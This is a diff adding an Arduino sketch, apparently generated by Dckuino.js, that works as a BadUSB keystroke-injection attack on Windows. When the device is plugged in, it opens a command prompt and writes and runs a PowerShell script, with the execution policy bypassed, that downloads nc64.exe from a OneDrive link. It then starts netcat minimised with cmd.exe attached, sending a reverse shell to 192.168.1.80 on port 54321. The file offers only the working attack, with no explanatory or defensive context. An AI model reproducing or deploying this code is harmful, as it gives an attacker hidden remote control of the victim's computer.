@@ -1,0 +1,52 @@
+/*
+ * Generated with <3 by Dckuino.js, an open source project !
+ */
+
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(400);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(100);
+
+  Keyboard.print("cmd");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.print("cd / & mkdir win & cd win & echo (wget 'https://25tkcq.db.files.1drv.com/y4mw9ffGutkvnXUqRqKItqJirDrJ8wYWum6pbGjdP5_iOn0ZIndArZt-2bF0UE1sjVEkDOmOXcY7TiilxuJCs1yiAAZkBjQqsFjBXGvcDdkhD0_VmbcngjJSg_rWXkelYsU2g9joxqcwtRYw4wFi8lPeLbig0BGlG39Mjuk_JevwMrzjaw0Fdd2DGXZFrXCtJEsHEVen8kh89fjd8q7QtU98w/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");
+
+  typeKey(KEY_RETURN);
+
+  delay(50);
+
+  Keyboard.print("START /MIN a.exe 192.168.1.80 54321 -e cmd.exe -d & exit");
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
